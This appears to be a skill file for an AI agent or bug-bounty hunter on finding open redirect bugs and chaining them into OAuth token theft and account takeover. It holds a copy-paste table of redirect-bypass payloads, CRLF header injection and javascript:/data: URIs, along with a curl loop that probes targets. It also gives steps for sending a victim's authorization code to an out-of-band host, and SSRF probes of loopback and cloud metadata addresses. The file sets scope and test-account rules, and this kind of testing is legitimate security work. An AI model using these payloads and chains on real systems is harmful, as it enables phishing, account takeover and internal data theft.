---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
sources: hackerone_public
report_count: 28
---

# HUNT-OPEN-REDIRECT — Open Redirect

Standalone open redirect is **Low** on most programs. It **pays** when a trusted-origin redirect becomes OAuth `redirect_uri`, token/Referer leak, SSRF follow, or header injection.

## Rails
- In-scope only. Send victims to **your** OOB host, never a third-party live site.
- Read-only probes (`HEAD`/`GET` with `--max-redirs 0`) by default. State-changing login/OAuth chains only with test accounts.
- One proof URL per sink. No mass-phishing.
- STOP at draft. Do not report location-echo without a **browser** follow (server parse ≠ browser parse).

## Decision tree
1. Collect sinks: query params, path prefixes, POST `return`, JSON `redirectUrl`, `Location`/`Refresh` headers, JS `location`/`window.open`, meta refresh, mobile deep links, OAuth `redirect_uri`/`RelayState`.
2. For each sink, try the bypass table until `Location` (or JS) points at **your** registerable host **and** a real browser navigates there.
3. If yes: **chain immediately** — is this host/path in an OAuth allowlist? Does a server-side fetcher follow it? Does a token ride the URL?
4. If the server accepts but the browser **stays on-target** (userinfo/`@` after first `/`) → **not** ATO. See `hunt-oauth` browser-vs-server table.

## Surface
```
redirect next url return returnTo continue dest destination go forward
location target redir redirect_uri callback checkout_url success_url cancel_url
RelayState loginHint returnUrl r u to jump out link post_logout_redirect_uri
/logout?returnTo=  /login?next=  /sso?callback=
```

## Bypass table (copy-paste)

| Class | Payload | Notes |
|---|---|---|
| Basic | `https://UNIQUE.oastify.com` | Always first |
| Protocol-relative | `//UNIQUE.oastify.com` | Common allowlist miss |
| Triple slash | `///UNIQUE.oastify.com` `////UNIQUE.oastify.com` | Browsers collapse this to protocol-relative. Confirm in a browser |
| Param pollution | `next=https://target.example/cb&next=https://UNIQUE.oastify.com` and the reverse | First value wins vs last value wins |
| Encoded userinfo | `https://target.example%40UNIQUE.oastify.com` | `%40` decoded before or after the allowlist check |
| Backslash | `/\UNIQUE.oastify.com` `\/\/UNIQUE.oastify.com` `/\\UNIQUE.oastify.com` | IIS/Tomcat/`\`→`/` |
| Userinfo | `https://target.com@UNIQUE.oastify.com` | Works **only** if `@` is still in authority (before first `/`) |
| Suffix host | `https://target.com.UNIQUE.oastify.com` | `startsWith` / unescaped `.` |
| Encoded dot/slash | `https://target.com%2eUNIQUE.oastify.com` `%2f%2fUNIQUE.oastify.com` `%5cUNIQUE.oastify.com` | Double-encode `%252f` |
| Null / whitespace | `https://UNIQUE.oastify.com%00.t.com` `%09` `%0a` `%0d` `%20` | Header/parser split |
| CRLF header inject | `https://t.com%0d%0aLocation:%20https://UNIQUE.oastify.com` | Extra `Location` / XSS via injected header |
| Fragment | `https://UNIQUE.oastify.com#.target.com` `https://UNIQUE.oastify.com%23.target.com` | Validator sees suffix |
| Open-scheme | `https:UNIQUE.oastify.com` `//UNIQUE%2eoastify.com` | parse_url vs WHATWG |
| Unicode slash | `https://UNIQUE.oastify.com／.target.com` `〱UNIQUE.oastify.com` | Normalization after check |
| Regex `$` missing | `https://target.com.evil.com` | Prefix-only allowlist |
| Trailing-dot origin | `https://target.com.` | Cookie/host confusion; sometimes allowlisted |
| JS URI | `javascript:alert(1)` `javascript://target.com%0aalert(1)` | Often XSS, not redirect; still test |
| Data URI | `data:text/html,<script>location='https://UNIQUE.oastify.com'</script>` | Rarely allowed |
| DOM sink | `?next=` written to `location.href` / `location.replace` / `window.open` without parse | Client-only — confirm in browser |
| Meta refresh | `<meta http-equiv=refresh content="0;url=...">` | HTML sink |
| Nested param | `https://target.com/logout?next=https://UNIQUE.oastify.com` as the **inner** redirect_uri | OAuth chain |

**PHP `parse_url` vs browser:** `https://target.com:@UNIQUE.oastify.com` / `https://target.com#@UNIQUE.oastify.com` — server host=`target.com`, browser may go to attacker. Always **headless-check**.

## Methodology
```bash
# 1) Discover
grep -Eo '(\?|&)(redirect|next|url|return|returnTo|continue|dest|callback|RelayState|to)=' urls.txt

# 2) Non-follow probe — unique OOB per param
curl -sI --max-redirs 0 "$URL" | grep -iE '^(HTTP|location|refresh):'

# 3) Bypass loop on one sink
BASE="https://$TARGET/login?next="
for P in \
  'https://UNIQUE.oastify.com' '//UNIQUE.oastify.com' '/\UNIQUE.oastify.com' \
  "https://$TARGET@UNIQUE.oastify.com" "https://$TARGET.UNIQUE.oastify.com" \
  'https://UNIQUE.oastify.com%23.t' '%2f%2fUNIQUE.oastify.com'; do
  echo "== $P"; curl -sI --max-redirs 0 "${BASE}${P}" | grep -i '^location:'
done
```

**Browser proof (mandatory for High/ATO):** Playwright/real browser: final `document.location.origin` must be your host. Server `Location` to attacker + browser staying on-target = not exploitable.

### OAuth chain (the money)
```
1. Find an open redirect on a host/path the OAuth client allowlists
2. redirect_uri=<that URL pointing at UNIQUE.oastify.com>
3. Victim (test B) completes authorize
4. code/token must HIT your OOB (log query string) → exchange as B
```
If allowlist is exact-path, the redirect must sit **on that path** (path traversal / `?next=` on `/callback`). See `hunt-oauth`.

### Server-side follow → SSRF
If **the app** fetches the redirect target (webhook preview, link unfurl, “proxy”, oauth “validate uri”):
```bash
curl -s "https://$TARGET/unfurl?url=http://UNIQUE.oastify.com"
# then internal: http://127.0.0.1/ / 169.254.169.254 — unique marker in body
```
Hand confirmed SSRF to `hunt-ssrf`. Do not scan the cloud metadata tree.

## Validation
- `Location`/`Refresh`/JS navigates to **your** unique host (browser, not curl-only).
- **OAuth/ATO:** code or token **received** OOB and exchanged — not merely a 302 to evil.
- **Phishing-only:** Low/Medium; many programs N/A it (`triage-validation` never-submit-standalone).
- Header CRLF: prove extra header or body inject with unique marker, not a theoretical `%0d`.
- One sink, one PoC. Do not dump 50 `qsreplace` hits.

**Severity:** redirect alone = **Low**. + OAuth code theft = **High–Critical**. + SSRF data = **High**. + header inject XSS = per `hunt-xss`. Login `next=` phishing = **Low** unless program pays.

## Chains
| Redirect | Compose | Impact |
|---|---|---|
| Trusted-host redirect | OAuth `redirect_uri` | ATO (`hunt-oauth`) |
| Logout `returnTo` | Session fixation (`hunt-session`) | Planted session |
| Server-side follow | SSRF (`hunt-ssrf`) | Internal read |
| Token in URL | Referer leak (`hunt-ato` Path 2) | Token theft |
| CRLF in Location | Response-split / cache poison | XSS / cache |

Cross-refs: `hunt-oauth`, `hunt-ato`, `hunt-ssrf`, `hunt-host-header`, `hunt-csrf`, `triage-validation`.

## Dedup gate
```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```
`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
